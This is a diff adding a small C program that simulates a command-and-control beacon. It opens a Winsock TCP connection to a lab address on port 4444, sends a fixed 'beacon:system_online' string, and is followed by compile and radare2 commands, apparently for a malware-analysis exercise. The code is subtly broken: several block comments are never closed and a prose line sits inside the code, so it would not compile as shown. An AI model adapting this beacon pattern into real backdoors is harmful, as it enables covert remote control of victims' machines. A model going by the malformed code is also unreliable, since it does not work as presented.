@@ -1,0 +1,37 @@
+#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+int main() {
+WSADATA wsa; /* it stores the information about winsock version
+SOCKET sock;
+struct sockaddr_in server;
+char message[] = &quot;beacon:system_online&quot;;
+WSAStartup(MAKEWORD(2,2), &amp;wsa); /* Initializes winsock library
+sock = socket(AF_INET, SOCK_STREAM, 0); /* Creates a TCP socket
+and it is used for Backdoors, C2 channels
+// Fake C2 server (Metasploitable 2 IP)
+server.sin_addr.s_addr = inet_addr(&quot;192.168.56.101&quot;); /* Converts ip
+address from string to binary format
+server.sin_family = AF_INET;
+server.sin_port = htons(4444);
+connect(sock, (struct sockaddr *)&amp;server, sizeof(server));
+send(sock, message, sizeof(message), 0);
+closesocket(sock);
+WSACleanup();
+
+return 0;
+}
+
+-----------------
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+radare2.r2 sample.exe
+i
+What this shows
+  File type (PE)
+  Architecture (x86_64)
+ij
+Provides:
+ JSON-formatted metadata
+ Compiler hints
+iz
+ii
+izz~beacon
